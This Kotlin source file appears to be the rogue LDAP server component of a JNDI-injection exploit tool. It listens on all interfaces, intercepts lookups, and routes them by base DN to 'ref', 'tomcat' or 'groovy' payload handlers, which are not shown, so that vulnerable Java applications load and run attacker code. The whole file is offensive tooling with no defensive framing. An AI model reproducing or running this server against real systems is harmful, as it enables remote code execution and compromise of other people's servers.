package ldap

import com.unboundid.ldap.listener.InMemoryDirectoryServer
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig
import com.unboundid.ldap.listener.InMemoryListenerConfig
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor
import util.*
import java.net.InetAddress
import javax.net.ServerSocketFactory
import javax.net.SocketFactory
import javax.net.ssl.SSLSocketFactory

class LDAPServer : InMemoryOperationInterceptor() {
    private val port = Options.ldapPort

    fun run() {
        val config = InMemoryDirectoryServerConfig("dc=example,dc=com").apply {
            setListenerConfigs(
                InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    SSLSocketFactory.getDefault() as SSLSocketFactory
                )
            )
            addInMemoryOperationInterceptor(this@LDAPServer)
        }
        InMemoryDirectoryServer(config).run { startListening() }
        println("LDAP server listening on 0.0.0.0:$port".blue())
    }

    override fun processSearchResult(result: InMemoryInterceptedSearchResult) {
        val base = result.request.baseDN

        log("Receive a request to $base")

        when {
            "ref" in base -> execByRef(result, base)
            "tomcat" in base -> execByTomcat(result, base)
            "groovy" in base -> execByGroovy(result, base)
            else -> log("Payload $base not found".red())
        }
    }
}

fun LDAPServer.log(text: String) = println("LDAP >> ".purple() + text)
